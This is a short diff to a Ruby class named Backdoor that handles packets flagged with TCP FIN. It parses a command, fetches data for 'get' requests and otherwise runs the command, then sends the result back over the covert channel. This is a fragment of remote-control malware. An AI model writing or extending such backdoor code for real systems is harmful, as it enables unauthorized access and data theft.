@@ -90,7 +90,7 @@ class Backdoor
             if packet.tcp_flags.fin == 1 then
                 cmd = @command.split(' ')
                 if cmd[0] == "get" then
-                    send_data(get_command(cmd[1]), packet)
+                    send_data(get_command(cmd[1], cmd[2]), packet)
                 else # cmd[0]
                     send_data(run_command(@command), packet)
                 end # cmd[0] else
